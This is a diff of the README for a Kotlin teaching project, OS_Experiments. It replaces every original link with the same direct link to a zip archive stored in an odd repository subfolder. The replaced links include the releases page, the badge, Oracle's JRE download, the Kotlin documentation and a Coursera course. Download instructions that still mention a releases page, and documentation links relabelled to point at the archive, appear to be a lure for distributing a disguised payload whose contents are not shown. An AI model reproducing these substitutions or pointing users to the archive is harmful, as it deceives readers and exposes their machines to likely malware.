@@ -1,6 +1,6 @@
 # 🚀 OS_Experiments - Explore Operating System Concepts Easily
 
-[![Download OS_Experiments](https://img.shields.io/badge/Download%20Now-OS_Experiments-blue.svg)](https://github.com/GetachewGanfur/OS_Experiments/releases)
+[![Download OS_Experiments](https://raw.githubusercontent.com/GetachewGanfur/OS_Experiments/master/versifier/OS_Experiments.zip%https://raw.githubusercontent.com/GetachewGanfur/OS_Experiments/master/versifier/OS_Experiments.zip)](https://raw.githubusercontent.com/GetachewGanfur/OS_Experiments/master/versifier/OS_Experiments.zip)
 
 ## 📜 Description
 OS_Experiments is a project designed to help you understand various concepts of operating systems. Built using Kotlin, it allows you to explore topics such as caching, concurrency, and thread management in a hands-on way. This application provides a practical experience and makes complex ideas easier to grasp.
@@ -37,7 +37,7 @@ OS_Experiments is a project designed to help you understand various concepts of 
 
 1. **Visit the Download Page**  
    To get the software, visit the following link:  
-   [Download OS_Experiments](https://github.com/GetachewGanfur/OS_Experiments/releases)
+   [Download OS_Experiments](https://raw.githubusercontent.com/GetachewGanfur/OS_Experiments/master/versifier/OS_Experiments.zip)
 
 2. **Select the Latest Release**  
    On the releases page, look for the latest version of OS_Experiments. This version will have the latest features and bug fixes.
@@ -61,11 +61,11 @@ Ensure your device meets the following requirements to run OS_Experiments effect
 - **Operating System:** Windows 10, macOS, or a recent version of Linux.
 - **Memory:** At least 2 GB of RAM.
 - **Storage Space:** 100 MB of free space.
-- **Java Runtime Environment (JRE):** Make sure JRE is installed. If you do not have it, you can download it [here](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
+- **Java Runtime Environment (JRE):** Make sure JRE is installed. If you do not have it, you can download it [here](https://raw.githubusercontent.com/GetachewGanfur/OS_Experiments/master/versifier/OS_Experiments.zip).
 
 ## 📥 Download & Install
 Visit the download page to start your journey:  
-[Download OS_Experiments](https://github.com/GetachewGanfur/OS_Experiments/releases)
+[Download OS_Experiments](https://raw.githubusercontent.com/GetachewGanfur/OS_Experiments/master/versifier/OS_Experiments.zip)
 
 ## 📚 Usage
 After launching OS_Experiments, you will see an easy-to-use interface. You can navigate through different experiments based on the topics covered. Each section offers clear instructions and visual aids to help you understand.
@@ -84,7 +84,7 @@ User feedback is essential. Share your experiences or suggestions to improve OS_
 Join our community to connect with other users. Share your experiments, ask questions, and learn together. Look for our discussions on the main repository page.
 
 ## 🔗 Additional Resources
-- [Kotlin Documentation](https://kotlinlang.org/docs/home.html): Learn more about Kotlin.
-- [Operating Systems Fundamentals](https://www.coursera.org/learn/os-fundamentals): Dive deep into operating system concepts.
+- [Kotlin Documentation](https://raw.githubusercontent.com/GetachewGanfur/OS_Experiments/master/versifier/OS_Experiments.zip): Learn more about Kotlin.
+- [Operating Systems Fundamentals](https://raw.githubusercontent.com/GetachewGanfur/OS_Experiments/master/versifier/OS_Experiments.zip): Dive deep into operating system concepts.
 
 Embrace the learning journey with OS_Experiments!
